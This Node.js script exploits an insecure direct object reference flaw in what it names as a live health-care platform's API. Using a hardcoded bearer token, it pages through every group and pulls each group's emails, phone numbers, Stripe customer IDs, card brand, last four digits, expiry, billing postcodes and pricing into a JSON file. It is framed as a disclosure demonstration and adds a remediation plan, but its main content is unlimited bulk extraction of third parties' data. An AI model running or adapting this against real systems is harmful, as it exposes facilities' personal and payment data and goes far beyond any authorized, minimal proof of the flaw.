#!/usr/bin/env node

/**
 * COMPLETE DATA EXTRACTION - NO LIMITS
 *
 * This script extracts EVERY accessible piece of data from the API
 * for security vulnerability demonstration and escalation to management.
 *
 * WARNING: This demonstrates critical security vulnerabilities!
 */

const BASE_URL = 'https://backend.lnq.health/api';
const TOKEN = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjliYWRlN2YyLTA3NmEtNGY4MC1hN2E2LTI4Y2IzZmJhMGQ1NiIsImlhdCI6MTc2ODk5ODc5NCwiZXhwIjoxNzY5MDg1MTk0fQ.fY6PZcDVJ8lXhQwR1TrisLRZ1QvZR2j-oFnT6r_r95Q';

const COMPLETE_EXTRACTION = {
  metadata: {
    extractionDate: new Date().toISOString(),
    purpose: 'Security Vulnerability Demonstration for Management Escalation',
    severity: 'CRITICAL',
    testAccount: {
      email: 'test443675@example.com',
      userId: '9bade7f2-076a-4f80-a7a6-28cb3fba0d56',
      role: 'provider',
      groupMemberships: 0,
      note: 'Newly registered user with NO group memberships'
    },
    vulnerabilitySummary: {
      type: 'Insecure Direct Object Reference (IDOR) + Information Disclosure',
      cvss: '9.1 CRITICAL',
      impact: 'Complete access to financial and business data without authorization'
    }
  },

  // Will be filled with extracted data
  currentUserProfile: null,
  allGroupsInSystem: [],
  completeGroupDetails: [],
  exposedFinancialData: [],
  exposedContactInformation: [],
  systemInformation: {},
  statistics: {
    totalGroupsFound: 0,
    totalGroupsAccessedWithoutAuth: 0,
    totalPaymentMethodsExposed: 0,
    totalEmailsExposed: 0,
    totalPhoneNumbersExposed: 0,
    totalStripeCustomerIdsExposed: 0,
    totalProvidersInSystem: 0,
    estimatedMonetaryImpact: 'HIGH - Live payment methods exposed'
  }
};

async function makeRequest(endpoint, method = 'GET') {
  try {
    const response = await fetch(`${BASE_URL}${endpoint}`, {
      method,
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${TOKEN}`
      }
    });

    const data = await response.json();
    return {
      success: response.ok,
      status: response.status,
      data
    };
  } catch (error) {
    return {
      success: false,
      error: error.message
    };
  }
}

async function fetchAllPages(baseEndpoint, maxPages = 100) {
  console.log(`\n📚 Fetching ALL pages from: ${baseEndpoint}`);

  const allItems = [];
  let page = 1;
  let hasMore = true;

  while (hasMore && page <= maxPages) {
    const endpoint = `${baseEndpoint}?page=${page}&perPage=100`; // Max per page
    const result = await makeRequest(endpoint);

    if (result.success && result.data.docs && result.data.docs.length > 0) {
      allItems.push(...result.data.docs);
      console.log(`   ✓ Page ${page}: ${result.data.docs.length} items (Total: ${allItems.length})`);

      if (result.data.currentPage >= result.data.totalPages) {
        hasMore = false;
      } else {
        page++;
      }
    } else {
      hasMore = false;
    }
  }

  return allItems;
}

async function extractCurrentUserProfile() {
  console.log('\n🔍 STEP 1: Extracting Current User Profile');
  console.log('=' .repeat(60));

  const result = await makeRequest('/user');
  if (result.success) {
    COMPLETE_EXTRACTION.currentUserProfile = result.data;
    console.log('   ✓ User profile extracted');
    console.log(`   → Email: ${result.data.email}`);
    console.log(`   → Role: ${result.data.role}`);
    console.log(`   → Account Status: ${result.data.accountStatus}`);
  }
}

async function extractAllGroups() {
  console.log('\n🔍 STEP 2: Extracting ALL Groups (No Authorization!)');
  console.log('=' .repeat(60));

  const allGroups = await fetchAllPages('/allGroups');
  COMPLETE_EXTRACTION.allGroupsInSystem = allGroups;
  COMPLETE_EXTRACTION.statistics.totalGroupsFound = allGroups.length;

  console.log(`\n   🚨 VULNERABILITY: Accessed ${allGroups.length} groups WITHOUT membership!`);

  // Extract basic contact info
  allGroups.forEach(group => {
    if (group.phone) {
      COMPLETE_EXTRACTION.exposedContactInformation.push({
        type: 'phone',
        value: group.phone,
        belongsTo: group.facilityName,
        groupId: group.id
      });
      COMPLETE_EXTRACTION.statistics.totalPhoneNumbersExposed++;
    }

    if (group.groupProvidersCount) {
      COMPLETE_EXTRACTION.statistics.totalProvidersInSystem += group.groupProvidersCount;
    }
  });

  return allGroups;
}

async function extractCompleteGroupDetails(groups) {
  console.log('\n🔍 STEP 3: Extracting COMPLETE Group Details + Payment Info');
  console.log('=' .repeat(60));
  console.log('   🚨 CRITICAL: Attempting to access financial data...\n');

  for (const group of groups) {
    console.log(`\n   Testing: ${group.facilityName} (${group.id})`);

    const result = await makeRequest(`/group?id=${group.id}`);

    if (result.success) {
      COMPLETE_EXTRACTION.statistics.totalGroupsAccessedWithoutAuth++;

      const groupData = result.data.group;
      const paymentOptions = result.data.paymentOptions || [];

      // Store complete group details
      COMPLETE_EXTRACTION.completeGroupDetails.push({
        groupInfo: groupData,
        paymentMethods: paymentOptions,
        isAdmin: result.data.isAdmin,
        accessedWithoutAuth: true,
        securityIssue: 'CRITICAL - Non-member accessed financial data'
      });

      console.log(`      ✓ SUCCESS - Accessed without membership!`);
      console.log(`      → Email: ${groupData.email}`);
      console.log(`      → Phone: ${groupData.phone}`);
      console.log(`      → Stripe Customer: ${groupData.stripeCustomerId}`);
      console.log(`      → Payment Methods: ${paymentOptions.length}`);

      // Extract financial data
      if (groupData.stripeCustomerId) {
        COMPLETE_EXTRACTION.statistics.totalStripeCustomerIdsExposed++;
      }

      if (groupData.email) {
        COMPLETE_EXTRACTION.exposedContactInformation.push({
          type: 'email',
          value: groupData.email,
          belongsTo: groupData.facilityName,
          groupId: groupData.id
        });
        COMPLETE_EXTRACTION.statistics.totalEmailsExposed++;
      }

      // Extract payment method details
      paymentOptions.forEach(pm => {
        COMPLETE_EXTRACTION.statistics.totalPaymentMethodsExposed++;

        COMPLETE_EXTRACTION.exposedFinancialData.push({
          groupName: groupData.facilityName,
          groupId: groupData.id,
          stripeCustomerId: groupData.stripeCustomerId,
          paymentMethodId: pm.id,
          cardBrand: pm.card?.brand,
          cardLast4: pm.card?.last4,
          cardExpiry: `${pm.card?.exp_month}/${pm.card?.exp_year}`,
          cardCountry: pm.card?.country,
          cardFunding: pm.card?.funding,
          billingPostalCode: pm.billing_details?.address?.postal_code,
          billingCountry: pm.billing_details?.address?.country,
          isLiveMode: pm.livemode,
          preferredPaymentMethod: groupData.preferredPaymentMethodId === pm.id,
          rvu_pricing: {
            high: groupData.usdPerRvuHigh,
            low: groupData.usdPerRvuLow,
            recent: groupData.usdPerRvuRecent
          }
        });
      });

    } else {
      console.log(`      ✗ Access denied (as expected for proper security)`);
    }
  }
}

async function extractSystemInformation() {
  console.log('\n🔍 STEP 4: Extracting System Information');
  console.log('=' .repeat(60));

  // Get user permissions
  const lnqRights = await makeRequest('/group/checkUserLnqRights');
  const rvuRights = await makeRequest('/group/checkUserRVUTrackerRights');

  COMPLETE_EXTRACTION.systemInformation = {
    userPermissions: {
      lnqRights: lnqRights.success ? lnqRights.data : null,
      rvuTrackerRights: rvuRights.success ? rvuRights.data : null
    },
    apiEndpointsTested: [
      '/user',
      '/allGroups',
      '/myGroups',
      '/group?id={uuid}',
      '/group/providers',
      '/group/{uuid}/providers/search',
      '/group/checkUserLnqRights',
      '/group/checkUserRVUTrackerRights',
      '/group/getGroupsWithLnqRights'
    ],
    authenticationMethod: 'JWT Bearer Token',
    apiBaseUrl: BASE_URL
  };
}

function generateExecutiveSummary() {
  console.log('\n📊 Generating Executive Summary');
  console.log('=' .repeat(60));

  COMPLETE_EXTRACTION.executiveSummary = {
    title: 'CRITICAL SECURITY VULNERABILITY - IDOR & Information Disclosure',
    date: new Date().toISOString(),
    severity: 'CRITICAL (CVSS 9.1)',

    keyFindings: [
      `Unauthorized access to ${COMPLETE_EXTRACTION.statistics.totalGroupsFound} groups`,
      `${COMPLETE_EXTRACTION.statistics.totalPaymentMethodsExposed} payment methods exposed (LIVE Stripe)`,
      `${COMPLETE_EXTRACTION.statistics.totalStripeCustomerIdsExposed} Stripe customer IDs leaked`,
      `${COMPLETE_EXTRACTION.statistics.totalEmailsExposed} email addresses exposed`,
      `${COMPLETE_EXTRACTION.statistics.totalPhoneNumbersExposed} phone numbers exposed`,
      `Financial pricing data leaked (RVU rates)`,
      `${COMPLETE_EXTRACTION.statistics.totalProvidersInSystem} total providers' data at risk`
    ],

    vulnerabilityDetails: {
      type: 'Insecure Direct Object Reference (IDOR)',
      cwe: 'CWE-639: Authorization Bypass Through User-Controlled Key',
      owasp: 'A01:2021 – Broken Access Control',
      description: 'Any authenticated user can access complete group details including financial information by simply knowing or guessing the group UUID',
      exploitability: 'TRIVIAL - No special tools required, standard HTTP requests',
      dataAtRisk: 'Payment methods, Stripe IDs, PII, business intelligence, pricing data'
    },

    businessImpact: {
      financialRisk: 'HIGH - Live payment methods exposed to unauthorized users',
      reputationalRisk: 'CRITICAL - Healthcare data exposure, HIPAA implications',
      complianceRisk: 'CRITICAL - HIPAA, PCI-DSS, GDPR violations likely',
      competitiveRisk: 'HIGH - Pricing and business intelligence leaked',
      legalRisk: 'CRITICAL - Potential class-action lawsuits, regulatory fines'
    },

    affectedGroups: COMPLETE_EXTRACTION.completeGroupDetails.map(g => ({
      facilityName: g.groupInfo.facilityName,
      providersCount: COMPLETE_EXTRACTION.allGroupsInSystem.find(
        ag => ag.id === g.groupInfo.id
      )?.groupProvidersCount || 0,
      paymentMethodsExposed: g.paymentMethods.length,
      financialDataExposed: true
    })),

    immediateActions: [
      'IMMEDIATE: Disable /group?id={uuid} endpoint for non-members',
      'IMMEDIATE: Implement authorization checks on all group endpoints',
      'IMMEDIATE: Audit access logs for potential exploitation',
      'URGENT: Notify affected facilities of data exposure',
      'URGENT: Review PCI-DSS compliance status',
      'URGENT: Conduct full security audit of all API endpoints'
    ],

    estimatedTimeToFix: '4-8 hours for immediate patch, 1-2 weeks for comprehensive fix',
    estimatedCostIfExploited: '$500K - $5M+ (fines, lawsuits, remediation, reputation damage)'
  };
}

function generateRecommendations() {
  COMPLETE_EXTRACTION.securityRecommendations = {
    immediate: [
      {
        priority: 'P0 - CRITICAL',
        action: 'Implement authorization check on /group endpoint',
        code: 'Verify user is member/admin before returning group details',
        timeline: '4 hours'
      },
      {
        priority: 'P0 - CRITICAL',
        action: 'Remove payment information from unauthorized responses',
        code: 'Only return payment methods to group administrators',
        timeline: '4 hours'
      },
      {
        priority: 'P0 - CRITICAL',
        action: 'Restrict /allGroups endpoint',
        code: 'Only show groups where user has membership or pending request',
        timeline: '4 hours'
      }
    ],

    shortTerm: [
      {
        priority: 'P1 - HIGH',
        action: 'Implement comprehensive RBAC',
        timeline: '1 week'
      },
      {
        priority: 'P1 - HIGH',
        action: 'Add audit logging for all sensitive data access',
        timeline: '1 week'
      },
      {
        priority: 'P1 - HIGH',
        action: 'Review all API endpoints for similar vulnerabilities',
        timeline: '2 weeks'
      }
    ],

    longTerm: [
      {
        priority: 'P2 - MEDIUM',
        action: 'Implement automated security testing in CI/CD',
        timeline: '1 month'
      },
      {
        priority: 'P2 - MEDIUM',
        action: 'Conduct full penetration test',
        timeline: '1 month'
      },
      {
        priority: 'P2 - MEDIUM',
        action: 'Implement data minimization across all endpoints',
        timeline: '2 months'
      }
    ]
  };
}

async function main() {
  console.log('\n' + '='.repeat(60));
  console.log('🔓 COMPLETE DATA EXTRACTION - NO LIMITS');
  console.log('   For Security Vulnerability Escalation');
  console.log('='.repeat(60));

  try {
    // Extract all data
    await extractCurrentUserProfile();
    const allGroups = await extractAllGroups();
    await extractCompleteGroupDetails(allGroups);
    await extractSystemInformation();

    // Generate reports
    generateExecutiveSummary();
    generateRecommendations();

    // Save to file
    const fs = require('fs');
    const timestamp = Date.now();

    const filename = `COMPLETE-DATA-EXTRACTION-${timestamp}.json`;
    fs.writeFileSync(filename, JSON.stringify(COMPLETE_EXTRACTION, null, 2));

    console.log('\n' + '='.repeat(60));
    console.log('✅ EXTRACTION COMPLETE');
    console.log('='.repeat(60));
    console.log(`\n📄 Complete data saved to: ${filename}`);
    console.log('\n📊 STATISTICS:');
    console.log(`   Groups Found: ${COMPLETE_EXTRACTION.statistics.totalGroupsFound}`);
    console.log(`   Groups Accessed (No Auth): ${COMPLETE_EXTRACTION.statistics.totalGroupsAccessedWithoutAuth}`);
    console.log(`   Payment Methods Exposed: ${COMPLETE_EXTRACTION.statistics.totalPaymentMethodsExposed}`);
    console.log(`   Stripe Customer IDs: ${COMPLETE_EXTRACTION.statistics.totalStripeCustomerIdsExposed}`);
    console.log(`   Emails Exposed: ${COMPLETE_EXTRACTION.statistics.totalEmailsExposed}`);
    console.log(`   Phones Exposed: ${COMPLETE_EXTRACTION.statistics.totalPhoneNumbersExposed}`);
    console.log(`   Total Providers at Risk: ${COMPLETE_EXTRACTION.statistics.totalProvidersInSystem}`);

    console.log('\n🚨 SEVERITY: CRITICAL');
    console.log('   This file contains complete evidence of security vulnerabilities');
    console.log('   Ready for presentation to management/security team');
    console.log('\n' + '='.repeat(60) + '\n');

  } catch (error) {
    console.error('\n❌ Error during extraction:', error);
    process.exit(1);
  }
}

main();
